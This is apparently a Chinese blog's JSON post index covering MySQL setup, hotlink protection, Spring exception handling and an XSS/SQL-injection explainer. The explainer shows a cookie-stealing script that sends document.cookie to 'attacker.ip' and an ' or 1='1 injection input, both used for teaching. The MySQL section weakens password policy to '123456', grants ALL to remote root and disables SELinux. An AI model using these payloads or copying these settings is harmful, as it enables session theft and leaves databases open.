新密码\n\n常见错误：\nERROR 1820 (HY000): You must reset your password using ALTER USER statement before executing this statement\n解决办法\neg：alter user  &#39;root&#39;@&#39;localhost&#39; identified by&#39;123456&#39;;\nERROR 1819 (HY000): Your password does not satisfy the current policy requirements\neg:alter user  &#39;root&#39;@&#39;localhost&#39; identified by&#39;QHDcm@1991&#39;;\n</code></pre>\n<h2 id=\"符合标准的新密码登录后为了能够改成简单密码，需要修改一些参数\"><a href=\"#符合标准的新密码登录后为了能够改成简单密码，需要修改一些参数\" class=\"headerlink\" title=\"符合标准的新密码登录后为了能够改成简单密码，需要修改一些参数\"></a>符合标准的新密码登录后为了能够改成简单密码，需要修改一些参数</h2><pre><code>mysql&gt; set global validate_password_policy=0;\nQuery OK, 0 rows affected (0.05 sec)\n\nmysql&gt; set global validate_password_mixed_case_count=0;\nQuery OK, 0 rows affected (0.00 sec)\n \nmysql&gt; set global validate_password_number_count=3;\nQuery OK, 0 rows affected (0.00 sec)\n \nmysql&gt; set global validate_password_special_char_count=0;\nQuery OK, 0 rows affected (0.00 sec)\n \nmysql&gt; set global validate_password_length=3;\nQuery OK, 0 rows affected (0.00 sec)\n \nmysql&gt; SHOW VARIABLES LIKE &#39;validate_password%&#39;;\n+--------------------------------------+-------+\n| Variable_name                        | Value |\n+--------------------------------------+-------+\n| validate_password_dictionary_file    |       |\n| validate_password_length             | 3     |\n| validate_password_mixed_case_count   | 0     |\n| validate_password_number_count       | 3     |\n| validate_password_policy             | LOW   |\n| validate_password_special_char_count | 0     |\n+--------------------------------------+-------+\n6 rows in set (0.00 sec)\n\nvalidate_password_dictionary_file\n插件用于验证密码强度的字典文件路径。\n\nvalidate_password_length\n密码最小长度，参数默认为8，它有最小值的限制，最小值为：validate_password_number_count + validate_password_special_char_count + (2 * validate_password_mixed_case_count)\n\nvalidate_password_mixed_case_count\n密码至少要包含的小写字母个数和大写字母个数。\n\nvalidate_password_number_count\n密码至少要包含的数字个数。\n\nvalidate_password_policy\n密码强度检查等级，0/LOW、1/MEDIUM、2/STRONG。有以下取值：\nPolicy                 Tests Performed                                                                                                        \n0 or LOW               Length                                                                                                                      \n1 or MEDIUM         Length; numeric, lowercase/uppercase, and special characters                             \n2 or STRONG        Length; numeric, lowercase/uppercase, and special characters; dictionary file      \n默认是1，即MEDIUM，所以刚开始设置的密码必须符合长度，且必须含有数字，小写或大写字母，特殊字符。  \nvalidate_password_special_char_count\n密码至少要包含的特殊字符数。\n</code></pre>\n<h3 id=\"在my-cnf中配置永久生效\"><a href=\"#在my-cnf中配置永久生效\" class=\"headerlink\" title=\"在my.cnf中配置永久生效\"></a>在my.cnf中配置永久生效</h3><pre><code>validate_password_policy=0\nvalidate_password_length=3\nvalidate_password_special_char_count=0\nvalidate_password_mixed_case_count=0\n</code></pre>\n<h3 id=\"修改为简单密码\"><a href=\"#修改为简单密码\" class=\"headerlink\" title=\"修改为简单密码\"></a>修改为简单密码</h3><pre><code>update  mysql.user  set  authentication_string=password(&quot;123456&quot;) where  user=&quot;root&quot;  and host=&quot;localhost&quot;;\n</code></pre>\n<h2 id=\"用户授权\"><a href=\"#用户授权\" class=\"headerlink\" title=\"用户授权\"></a>用户授权</h2><pre><code>grant all privileges on *.* to root@&#39;localhost&#39; identified by &#39;123456&#39; with grant option;  \nflush privileges;\nquit;\nCREATE USER &#39;javacui&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;123456&#39;; \nCREATE USER &#39;javacui&#39;@&#39;172.20.0.0/255.255.0.0&#39; IDENDIFIED BY &#39;123456&#39;; \nCREATE USER &#39;javacui&#39;@&#39;%&#39; IDENTIFIED BY &#39;123456&#39;; \nCREATE USER &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;123456&#39;; \nCREATE USER &#39;mysql&#39;@&#39;%&#39; IDENTIFIED BY &#39;123456&#39;; \nCREATE USER &#39;javacui&#39;@&#39;%&#39; IDENTIFIED BY &#39;&#39;; \nCREATE USER &#39;javacui&#39;@&#39;%&#39;;\nCREATE USER &#39;mysql&#39;@&#39;%&#39;;\nCREATE USER &#39;root&#39;@&#39;%&#39;;\nALTER USER &#39;root&#39;@&#39;%&#39; PASSWORD EXPIRE NEVER;\ndatabasename –  数据库名\ntablename - 表名,如果要授予该用户对所有数据库和表的相应操作权限则可用* 表示, 如*.*\nGRANT privileges ON databasename.tablename TO &#39;username&#39;@&#39;host&#39;;\nGRANT SELECT, INSERT ON test.user TO &#39;javacui&#39;@&#39;%&#39;; \nGRANT ALL ON *.* TO &#39;javacui&#39;@&#39;%&#39;;\nGRANT ALL ON *.* TO &#39;root&#39;@&#39;%&#39;;\nGRANT ALL ON *.* TO &#39;mysql&#39;@&#39;%&#39;;\n</code></pre>\n<h2 id=\"设置与更改用户密码\"><a href=\"#设置与更改用户密码\" class=\"headerlink\" title=\"设置与更改用户密码\"></a>设置与更改用户密码</h2><pre><code>SET PASSWORD FOR &#39;username&#39;@&#39;host&#39; = PASSWORD(&#39;newpassword&#39;);\n撤销用户权限\nREVOKE privilege ON databasename.tablename FROM &#39;username&#39;@&#39;host&#39;;\nprivilege, databasename, tablename – 同授权部分\nREVOKE SELECT ON *.* FROM &#39;javacui&#39;@&#39;%&#39;;\n删除用户\nDROP USER ‘username’@&#39;host’;\n操作后切记刷新数据库\nflush privileges;\n</code></pre>\n<h2 id=\"安装好的mysql-关机后就起不来了\"><a href=\"#安装好的mysql-关机后就起不来了\" class=\"headerlink\" title=\"安装好的mysql,关机后就起不来了\"></a>安装好的mysql,关机后就起不来了</h2><pre><code>查看了一下MySQL的启动日志`less /var/log/mysqld.log` \n错误日志如下：\n[ERROR] Can’t start server: can’t create PID filepath: No such file or directory\n\n错误原因\n一般是由于服务器强制关机导致pid文件丢失。\n\n解决办法\n在/etc/my.cnf 中查看pid-file的位置\n\npid-file=/var/run/mysql/mysqld.pid\n创建对应的目录并修改权限\n\nmkdir -p /var/run/mysql\ntouch /var/run/mysql/mysqld.pid\n\n因为MySQL启动是用mysql这个用户运行的,我们之前用的是root用户创建的文件夹,那么mysql用户是没有权限的,所以我们需要给mysql用户授权\nchown mysql.mysql /var/run/mysql/mysqld.pid\n再启动MySQL应该就没问题了。\nservice mysqld start\nStarting mysqld (via systemctl): [ 确定 ]\n到此, 启动成功了\n然而并没有结束\n再次重启动虚拟机, mysql服务又又又TM起不起来了, 依然是老问题, 但是每次都去配置一下, 也不是个事.\n虽然可以写个脚本解决, 但是感觉还是不方便.遂~ 我把pid文件的位置换了个地方.\n这里需要说明一下, 默认mysqld.pid的路径是`/var/run/mysqld/mysqld.pid` 这个路径是放在内存中的, 所以每次关机了就会删除.\n我把这个文件换到了这个路径下面`/var/lib/mysql/mysqld.pid`,需要做的修改如下:\n\n### 1. 修改配置文件\n修改`/etc/my.cnf`里面的pid-file值为这样:\npid-file=/var/lib/mysql/mysqld.pid\n\n### 2. 修改启动文件\n修改`/etc/init.d/mysqld`文件里面的pid-file为这样:(使用vim命令, 然后找到这一行修改)\nget_mysql_option pid-file &quot;/var/lib/mysql/mysqld.pid&quot; mysqld mysqld_safe\n\n### 3. 重新加载启动文件\nsystemctl daemon-reload\n\n### 4. 重启MySQL\nservice mysqld start\n\n### 5. 将MySQL加入开机启动\n如果你的mysql没有开启启动,可以使用这个命令加入:\nchkconfig mysqld on\nCan&#39;t create/write to file &#39;/home/mysql/data/is_writable&#39; (Errcode: 13 - Permission denied)\nchown mysql.mysql -R /home/mysql/data\nvi /etc/selinux/config  改成disabled\n</code></pre>\n<h2 id=\"数据库报错：this-is-incompatible-with-sql-mode-only-full-group-by\"><a href=\"#数据库报错：this-is-incompatible-with-sql-mode-only-full-group-by\" class=\"headerlink\" title=\"数据库报错：this is incompatible with sql_mode=only_full_group_by\"></a>数据库报错：this is incompatible with sql_mode=only_full_group_by</h2><pre><code>select 选取分组中的列+聚合函数 from 表名称 group by 分组的列 \n从语法格式来看，是先有分组，再确定检索的列，检索的列只能在参加分组的列中选。\nONLY_FULL_GROUP_BY的意思是：对于GROUP BY聚合操作，如果在SELECT中的列，没有在GROUP BY中出现，那么这个SQL是不合法的，因为列不在GROUP BY从句中，\n也就是说查出来的列必须在group by后面出现否则就会报错，或者这个字段出现在聚合函数里面。\n\n查看mysql版本命令：select version();\n查看sql_model参数命令：\nSELECT @@GLOBAL.sql_mode;\nSELECT @@SESSION.sql_mode;\n发现：\nONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION\n第一项默认开启ONLY_FULL_GROUP_BY，\n解决方法：\n1.只选择出现在group by后面的列，或者给列增加聚合函数；（不推荐）\n2.命令行输入：\nset @@GLOBAL.sql_mode=&#39;&#39;;\nset sql_mode =&#39;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&#39;;\n默认关掉ONLY_FULL_GROUP_BY！\n \n这个时候 在用工具select 一下\nSELECT @@sql_mode;\nSELECT @@GLOBAL.sql_mode;\n \n发现已经不存在ONLY_FULL_GROUP_BY ，感觉已经OK。但是如果你重启Mysql服务的话，发现ONLY_FULL_GROUP_BY还是会存在的\n \n想要彻底解决这个问题 就得去改my.ini 配置 （如果你们mysql 没有这个文件，就把my-default.ini 改成my.ini，我这个版本就是没有my.ini配置问题）\n \n在 [mysqld]和[mysql]下添加\nsql_mode =STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION\n\n\nmysql数据库的中有一个环境变量sql_mode,定义了mysql应该支持的sql语法，数据校验等\nmysql5.0以上版本支持三种sql_mode模式：ANSI、TRADITIONAL和STRICT_TRANS_TABLES。\nANSI模式：宽松模式，对插入数据进行校验，如果不符合定义类型或长度，对数据类型调整或截断保存，报warning警告。\nTRADITIONAL模式：严格模式，当向mysql数据库插入数据时，进行数据的严格校验，保证错误数据不能插入，报error错误。用于事物时，会进行事物的回滚。\nSTRICT_TRANS_TABLES模式：严格模式，进行数据的严格校验，错误数据不能插入，报error错误。   \n</code></pre>\n<h2 id=\"CentOs7-mysql开机启动设置\"><a href=\"#CentOs7-mysql开机启动设置\" class=\"headerlink\" title=\"CentOs7 mysql开机启动设置\"></a>CentOs7 mysql开机启动设置</h2><pre><code>mysql开机启动:\n/usr/lib/systemd/systemd-sysv-install enable mysql\n查看开机启动程序:\nsystemctl list-unit-files\n</code></pre>\n","categories":["database"],"tags":["mysql"]},{"title":"防盗链技术","url":"/2020/01/16/%E9%98%B2%E7%9B%97%E9%93%BE%E6%8A%80%E6%9C%AF/","content":"<h2 id=\"盗链\"><a href=\"#盗链\" class=\"headerlink\" title=\"盗链\"></a>盗链</h2><pre><code>指在自己的页面上展示一些并不在自己服务器上的内容\n通常的做法是通过技术手段获得它人服务器上的资源地址，绕过别人的资源展示页面，直接在自己的页面上向最终用户提供此内容.\n比较常见的是一些小站盗用大站的资源（图片、音乐、视频、软件等），对于这些小站来说，通过盗链的方法可以减轻自己服务器的负担，\n因为真实的空间和流量均是来自别人的服务器。\n</code></pre>\n<h2 id=\"防盗链\"><a href=\"#防盗链\" class=\"headerlink\" title=\"防盗链\"></a>防盗链</h2><pre><code>防止别人通过一些技术手段绕过本站的资源展示页面，盗用本站的资源，让绕开本站资源展示页面的资源链接失效。\n实施防盗链系统后，因为屏蔽了那些盗链的间接资源请求，从而可以大大减轻服务器及带宽的压力，也正如此，\n越来越多的站点都开始实施防盗链技术。\n</code></pre>\n<h2 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h2><pre><code>1.第三方网站访问下载非本地域名图片,视频,文件等资源时进行阻止下载,通过设置黑白名单,限制资源在制定服务器(域名)才能访问\n2.在HTTP协议中，有一个表头字段叫referer，采用URL的格式来表示从哪儿链接到当前的网页或文件。\n  换句话说，通过referer，网站可以检测目标网页访问的来源网页，如果是资源文件，则可以跟踪到显示它的网页地址。\n  有了referer跟踪来源就好办了，通过校验Http请求头中的referer,一旦检测到来源不是本站即进行阻止或者返回指定的页面。\n</code></pre>\n<p>   <img src=\"/images/security/referer.png\"> </p>\n<h2 id=\"具体实现细节\"><a href=\"#具体实现细节\" class=\"headerlink\" title=\"具体实现细节\"></a>具体实现细节</h2><pre><code>判断Http请求头referer域中的记录来源的值,如果和当前访问的域名不一致,说明该图片可能被其他服务器盗用\n实现: 限制资源(图片,视频，文件等)只能在某个域名(限制某个服务器)来源上进行访问 \n使用过滤器拦截请求,判断请求头中的域名(referer记录)与需要限制的域名访问是否一致,如果不一致,说明可能被盗用,进行拦截\neg: 自己访问自己域名一致,可以访问资源\n    第三方网站访问域名referer是第三方网站域名,与本地域名不一致,提示不能访问\n测试: localhost:9090 页面直接访问http://localhost:8080/imgs/01.png,提示不能访问该图片\n直接访问http://localhost:8080/imgs/01.png,提示不能访问该图片\n进入localhost:8080自己页面后,访问该图片,访问成功\neg: 视频云里黑白名单控制,即使你知道视频地址也无法播放\n</code></pre>\n","categories":["架构设计"],"tags":["web安全"]},{"title":"统一异常处理方案","url":"/2019/04/10/%E7%BB%9F%E4%B8%80%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%96%B9%E6%A1%88/","content":"<h2 id=\"传统异常处理\"><a href=\"#传统异常处理\" class=\"headerlink\" title=\"传统异常处理\"></a>传统异常处理</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">service层处理 try&#123;...&#125;catch(Exception e)&#123;...&#125;finally&#123;...&#125;<br>controller层处理 try&#123;...&#125;catch(Exception e)&#123;...&#125;finally&#123;...&#125;<br></code></pre></td></tr></table></figure>\n<pre><code>存在问题:\n1.每个service/controller都要处理\n2.异常的原因\n</code></pre>\n<h2 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h2><pre><code>1.service统一编码原则:先校验后判断，有问题时抛出具体异常信息,最后执行具体业务操作,返回成功信息\n2.在统一异常处理类中取捕获异常,无需controller捕获异常,向用户返回统一规范相应信息.\n</code></pre>\n<p>   <img src=\"/images/exception/exception.png\" alt=\"异常处理\"></p>\n<pre><code>异常分类:\n自定义异常(可预知异常):根据自己业务需要给出用户相关异常提示\n不可预知异常:运行时由于各种原因导致的异常,当然对于抛出的异常也可以单独处理\n</code></pre>\n<h2 id=\"统一异常处理流程\"><a href=\"#统一异常处理流程\" class=\"headerlink\" title=\"统一异常处理流程\"></a>统一异常处理流程</h2><pre><code>1.自定义异常类型\n2.自定义错误代码及错误信息\n3.统一抛出自定义异常类\n4.对于可预知异常我们主动抛出,sprinmvc统一捕获,这个异常是我们来控制的,异常信息尽量写的通俗易懂且全面\n5.对于不可预知异常由springmvc统一捕获Exception类型的异常\n6.无论是可预知异常还是不可预知异常,统一返回固定的信息格式:错误代码+错误信息\n</code></pre>\n<h2 id=\"代码编写\"><a href=\"#代码编写\" class=\"headerlink\" title=\"代码编写\"></a>代码编写</h2><pre><code>自定义异常CustomerException extends RuntimeException:方法上无需抛出或者捕获,侵入性低\n相比继承Exception:需要在方法上抛出或者捕获,侵入性高\n</code></pre>\n<h3 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h3><pre><code>统一异常信息及码值\npublic interface ResultCode &#123;\n    //操作是否成功,true为成功，false操作失败\n    boolean success();\n    //操作代码\n    int code();\n    //提示信息\n    String message();\n\n&#125;\npublic enum CommonCode implements ResultCode &#123;\n    INVALIAD_PARAM(false, 10003, &quot;参数错误!!&quot;),\n    // 成功\n    SUCCESS(true, 10000, &quot;操作成功！&quot;),\n    // 失败\n    FAIL(false, 11111, &quot;操作失败！&quot;);\n    private CommonCode(boolean success, int code, String message) &#123;\n            this.success = success;\n            this.code = code;\n            this.message = message;\n        &#125;\n&#125;\n\n统一抛出自定义异常类\npublic class CustomerException extends RuntimeException &#123;\n    ResultCode resultCode;\n\n    public ResultCode getResultCode() &#123;\n        return resultCode;\n    &#125;\n\n    public CustomerException(ResultCode resultCode) &#123;\n        this.resultCode = resultCode;\n    &#125;\n&#125;\n\n自定义异常\npublic class CustomerException extends RuntimeException &#123;\n    ResultCode resultCode;\n\n    public ResultCode getResultCode() &#123;\n        return resultCode;\n    &#125;\n\n    public CustomerException(ResultCode resultCode) &#123;\n        this.resultCode = resultCode;\n    &#125;\n&#125;\n\n统一异常捕获类\n@ControllerAdvice\npublic class ExceptionHandler &#123;\n    private static final Logger logger = LoggerFactory.getLogger(ExceptionHandler.class);\n    /**\n     * 未知异常处理\n     * ImmutableMap:只读，支持并发操作\n     */\n    private static ImmutableMap&lt;Class&lt;? extends Throwable&gt;, ResultCode&gt; EXCEPTIONS;\n    /**\n     * 定义mapBuilder\n     */\n    protected static ImmutableMap.Builder&lt;Class&lt;? extends Throwable&gt;, ResultCode&gt; builder = ImmutableMap.builder();\n\n    static &#123;\n        // 定义指定异常对应的错误代码\n        builder.put(HttpMessageNotReadableException.class, CommonCode.INVALIAD_PARAM);\n    &#125;\n    @org.springframework.web.bind.annotation.ExceptionHandler(CustomerException.class)\n    @ResponseBody\n    public ResponseResult handlerCustomerException(CustomerException customerException) &#123;\n        logger.error(&quot;catch ex :&#123;&#125;&quot;, customerException.getMessage());\n        ResultCode resultCode = customerException.getResultCode();\n        return new ResponseResult(resultCode);\n\n    &#125;\n\n    @org.springframework.web.bind.annotation.ExceptionHandler(Exception.class)\n    @ResponseBody\n    public ResponseResult handlerException(Exception exception) &#123;\n        logger.error(&quot;catch ex :&#123;&#125;&quot;, exception.getMessage());\n        if (EXCEPTIONS == null) &#123;\n            EXCEPTIONS=builder.build();//创建后不可更改\n        &#125;\n        ResultCode resultCode = EXCEPTIONS.get(exception);\n        if (null != resultCode) &#123;\n            return new ResponseResult(resultCode);\n        &#125;\n        return new ResponseResult(CommonCode.SERVER_ERROR);\n\n    &#125;\n\n&#125;\n</code></pre>\n","categories":["spring-boot"],"tags":["java"]},{"title":"xss和sql注入","url":"/2020/01/08/xss%E5%92%8Csql%E6%B3%A8%E5%85%A5/","content":"<h2 id=\"目的\"><a href=\"#目的\" class=\"headerlink\" title=\"目的\"></a>目的</h2><pre><code>1.避免代码被攻击\n2.如何做到项目安全保障\n</code></pre>\n<h2 id=\"项目安全隐患\"><a href=\"#项目安全隐患\" class=\"headerlink\" title=\"项目安全隐患\"></a>项目安全隐患</h2><pre><code>1.代码\n2.业务逻辑\n3.应用\n</code></pre>\n<h2 id=\"web安全常用攻击手段\"><a href=\"#web安全常用攻击手段\" class=\"headerlink\" title=\"web安全常用攻击手段\"></a>web安全常用攻击手段</h2><pre><code>xss\nsql注入\n防盗链\n</code></pre>\n<h2 id=\"什么是XSS攻击\"><a href=\"#什么是XSS攻击\" class=\"headerlink\" title=\"什么是XSS攻击?\"></a>什么是XSS攻击?</h2><pre><code>Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入攻击。\n攻击者通过在目标网站上注入恶意脚本，使之在用户的浏览器上运行。\n利用这些恶意脚本，攻击者可获取用户的敏感信息如 Cookie、SessionID 等，进而危害数据安全。\n为了和 CSS 区分，这里把攻击的第一个字母改成了 X，于是叫做 XSS。\n\nXSS 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；\n浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。\n</code></pre>\n<h2 id=\"常见的XSS危害举例\"><a href=\"#常见的XSS危害举例\" class=\"headerlink\" title=\"常见的XSS危害举例\"></a>常见的XSS危害举例</h2><pre><code>1.盗取cookie,通过cookie信息伪造请求\n   &lt;script&gt;\n    // 通过动态构造一个img标签，将当前页面的cookie发送给attack.com\n    new Image().src = &quot;http://attacker.ip/&quot; + document.cookie;\n   &lt;/script&gt;\n2.钓鱼\neg: 在一个页面提交表单后，到另一个页面展示，可能会受到XSS脚本注入，读取本地cookie远程发送给黑客服务器端。\neg: 链接中包含用户信息，被第三方拦截，添加js脚本，跳转到钓鱼网站的转账页面，用户未能识别钓鱼网站而被骗\n例如:某wx群分享了一个连接,点击这个连接，打开后的网址和某宝极其相似,比如类似这种www.taoobao.com\n你如果没有区分出网址的错误,而在打开的连接中输入转账信息的表单,这个页面带着你的转账信息+&lt;js跳转转账网址&gt;\n又调到了转账页面,一点击转账,凉了...\n测试脚本:\n&lt;script&gt;alert(&#39;sss&#39;)&lt;/script&gt;\neg: 比如论坛或者贴吧的评论区,如果不对xss攻击进行处理,比如类似如下这种\n&lt;script&gt;window.location.href=&#39;http://www.baidu.com&#39;;&lt;/script&gt;\n那么当普通用户进入评论页,会自动跳转到www.baidu.com,自己的网站被别人引流了,惨不惨!!\n</code></pre>\n<h2 id=\"如何防御XSS攻击\"><a href=\"#如何防御XSS攻击\" class=\"headerlink\" title=\"如何防御XSS攻击?\"></a>如何防御XSS攻击?</h2><pre><code>将脚本特殊字符，转换成html源代码进行展示。比如&#39;&lt;&#39; 在html想展示符号内容而不是被浏览器解析,需要转为&amp;lt;\n测试脚本处理后对应html源代码: &amp;lt;script&amp;gt;alert(&#39;sss&#39;)&amp;lt;/script&amp;gt;\n项目一般处理方式:写一个过滤器,拦截所有请求,将参数中的特殊字符进行过滤处理\n 可以借助commons包下工具类,完成特殊字符转换\n &lt;dependency&gt;\n    &lt;groupId&gt;commons-lang&lt;/groupId&gt;\n    &lt;artifactId&gt;commons-lang&lt;/artifactId&gt;\n    &lt;version&gt;2.6&lt;/version&gt;\n  &lt;/dependency&gt;\n  \n</code></pre>\n<p>   <img src=\"/images/security/common.png\"></p>\n<h2 id=\"sql注入\"><a href=\"#sql注入\" class=\"headerlink\" title=\"sql注入\"></a>sql注入</h2><pre><code>根据sql语法,输入相关字符,改变原sql形成攻击sql\n如:mybatis 中$符号拼接sql时需要程序员添加&#39;,这里当攻击者通过&#39;的技巧输入形成新sql,从而直接对MYSQL进行数据攻击\neg: select username,password from user where user=&#39;$&#123;username&#125;&#39; and password=&#39;$&#123;password&#125;&#39;;\n当攻击url: http://ip:port/find?username=zhangsan&amp;password=&#39;or 1= &#39;1\n形成攻击sql:select username,password from user where user=&#39;zhangsan&#39; and password=&#39;&#39; or 1 =&#39;1&#39;;\n后果: 可完成查询所有用户数据,用户数据泄露\n</code></pre>\n<h2 id=\"如何防御sql攻击\"><a href=\"#如何防御sql攻击\" class=\"headerlink\" title=\"如何防御sql攻击\"></a>如何防御sql攻击</h2><pre><code>1.编写dao层尽量不要使用sql拼接,使用预编译方式,比如mybatis中的#替换$\n2.如果使用了sql拼接,要对入参含有特殊字符进行处理\n</code></pre>\n<h2 id=\"MyBatis-与-区别\"><a href=\"#MyBatis-与-区别\" class=\"headerlink\" title=\"MyBatis #与$区别\"></a>MyBatis #与$区别</h2><pre><code>#&#123;&#125;: 解析为一个 JDBC 预编译语句（prepared statement）的参数标记符，一个 #&#123;&#125; 被解析为一个参数占位符,可以防止SQL注入问题。\n$&#123;&#125;: 仅仅为一个纯碎的 string 替换，在动态 SQL 解析阶段将会进行变量替换。\n</code></pre>\n","categories":["架构设计"],"tags":["web安全"]}]